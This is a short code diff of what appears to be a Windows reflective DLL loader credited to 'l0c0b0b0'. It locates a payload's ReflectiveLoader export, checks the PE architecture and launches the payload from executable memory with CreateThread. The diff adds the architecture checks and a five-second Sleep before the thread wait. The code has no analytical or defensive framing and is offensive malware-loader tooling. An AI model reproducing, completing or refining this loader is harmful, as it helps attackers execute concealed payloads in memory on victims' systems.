@@ -1,5 +1,6 @@
 /*
-author: l0c0b0b0
+ author: l0c0b0b0
+
 */
 #include <winternl.h>
 #include <windows.h>
@@ -92,10 +93,12 @@ DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
 
 	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
 
+	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B)
 	{
 		if (dwCompiledArch != 1)
 			return 0;
 	}
+	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B)
 	{
 		if (dwCompiledArch != 2)
 			return 0;
@@ -160,6 +163,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	RefLdrOffset = GetReflectiveLoaderOffset(payload);
 	if (rv != 0) {
 		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)((ULONG_PTR)exec_mem + RefLdrOffset), 0, 0, 0);
+		Sleep(5000);
 		WaitForSingleObject(th, INFINITE);
 	}
 
